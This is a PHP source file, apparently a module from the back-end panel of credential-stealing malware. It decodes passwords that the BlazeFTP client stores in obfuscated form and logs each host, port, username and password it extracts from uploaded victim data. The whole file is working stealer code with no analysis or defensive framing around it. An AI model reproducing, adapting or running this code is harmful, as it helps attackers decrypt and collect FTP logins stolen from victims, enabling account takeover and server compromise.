<?php
//ok
class Module_blazeftp extends Module_
{
    private function Decrypt($Password)
    {
        $Password = trim($Password);
        if (!strlen($Password))
            return '';

        $Password = hex2bin($Password);
        if ($Password === false)
            return '';

        $Result = '';
        for ($i = 0; $i < strlen($Password); $i++)
            $Result .= chr(~((ord($Password[$i]) << 4) + (ord($Password[$i]) >> 4)));
		
        return $Result;
    }
    protected function ProcessBlazeFile($Data)
    {
        if (strlen($Data) <= 4)
            return;

        $INI_ = parse_ini($Data);
		if($INI_ == NULL)
			return;
		
        foreach ($INI_ as $Section)
        {
            if (!is_array($Section))
                continue;
			
            $Host = Assign_($Section["address"]);
            $User = Assign_($Section["username"]);
            $Pass = $this->Decrypt($Section["password"]);
            $Port = Assign_($Section["port"]);
			
            $this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
        }
		
		$INI_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessBlazeFile($Data);
            break;
        case 1:
				$stream = new Stream($Data);
				$User	= $stream->getSTRING_();
				if($User == NULL)
					break;

				$Host 	= $stream->getSTRING_();
				$Pass	= $this->Decrypt($stream->getSTRING_());
				$Port	= $stream->GetDWORD();

				$this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
				$stream = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

